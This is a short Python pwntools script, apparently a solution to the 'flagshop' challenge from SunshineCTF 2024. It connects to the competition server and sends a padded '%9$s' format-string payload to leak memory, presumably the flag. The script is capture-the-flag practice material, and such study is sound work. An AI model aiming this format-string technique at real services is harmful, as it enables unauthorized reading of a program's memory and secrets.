#!/usr/bin/env python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

elf = ELF('./flagshop')

padding1 = b'p' * 32
formatstr = b'%9$s'
padding2 = b'a' * 32
payload = b''.join([padding1, formatstr, padding2])

p = remote('2024.sunshinectf.games', 24001)
p.recvlines(10)
p.sendline(b'test')
p.recvline()
p.sendline(payload)
p.interactive()
